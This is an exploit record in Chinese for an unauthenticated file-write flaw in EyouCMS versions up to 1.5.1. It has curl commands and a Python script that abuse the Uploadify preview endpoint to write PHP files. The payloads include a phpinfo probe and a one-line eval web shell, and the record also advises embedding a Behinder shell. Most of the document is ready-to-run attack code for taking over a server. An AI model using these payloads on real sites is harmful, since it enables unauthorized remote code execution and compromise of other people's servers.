# EyouCMS 前台任意文件写入 GetShell（api/Uploadify::preview 后缀绕过）

- **code**: eyoucms-前台任意文件写入-getshell-api-uploadify-preview-后缀绕过
- **kind**: exp
- **category**: file-upload
- **component**: EyouCMS
- **versions**: EyouCMS 1.0 – 1.5.1
- **severity**: critical
- **language**: http
- **source**: web
- **source_url**: https://cloud.tencent.cn/developer/article/1690304
- **verified_note**: 未在真实目标验证；公开复现文章 + 官方 master 源码（该接口已 exit 废弃）交叉印证。
- **tags**: eyoucms,文件上传,getshell,前台未授权,Uploadify
- **created_at**: 2026-10-06T12:14:04.325Z
- **found_by**: exploit

## 描述

application/api/controller/Uploadify.php 的 preview()：preg_match("#^data:image/(\w+);base64,(.*)$#", $src, $matches) 把 $matches[1] 直接当后缀拼文件名 md5($base64).".".$type 后 file_put_contents 原样落盘，无内容/类型校验。(\w+) 允许 php → 可直接写 php 马。前台未授权，1 包 getshell。

## 用法

```
# 探针（1 包）
curl -sk -X POST 'http://TARGET/example.com/api/Uploadify/preview' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  --data-binary 'data:image/php;base64,PD9waHAgcGhwaW5mbygpOw=='
# 命中回显 {"jsonrpc":"2.0","result":"http://TARGET/preview/c7a10e2172ba0f171ec45f376fb0601d.php","id":"id"}
# 访问 result 字段给出的完整 URL 即可（或 /preview/<md5>.php）
# 写马: data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs=  → 文件名 f70a09a2a94dc79f6cd6797026d8f7ac.php
# 冰蝎马: base64 -w0 behinder.php 后拼进 body，文件名 = md5(纯base64字符串)
# 等价路由 /example.com?m=api&c=Uploadify&a=preview
```

## 正文

```
#!/usr/bin/env python3
# EyouCMS <=1.5.1 前台任意文件写入 GetShell —— 最小实现
import base64, hashlib, requests
requests.packages.urllib3.disable_warnings()

TARGET = "http://TARGET"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.36 Safari/537.36"

def upload(b64, path="/example.com/api/Uploadify/preview"):
    body = ("data:image/php;base64,%s" % b64).encode()
    r = requests.post(TARGET + path, data=body, verify=False, timeout=15,
                      headers={"User-Agent": UA, "Content-Type": "text/plain;charset=UTF-8"})
    return r

PROBE = "PD9waHAgcGhwaW5mbygpOw=="            # <?php phpinfo();
SHELL = "PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs="      # <?php @eval($_POST[a]);

r = upload(PROBE)
print(r.status_code, r.text[:300])
name = hashlib.md5(PROBE.encode()).hexdigest() + ".php"
print("落盘文件名(本地预计算):", name)
print("访问:", TARGET + "/preview/" + name)

# 变体站点（响应文件名被 convert_uuencode 编码）的官方处理方式见 runs/eyou-exp/02-*.py

```
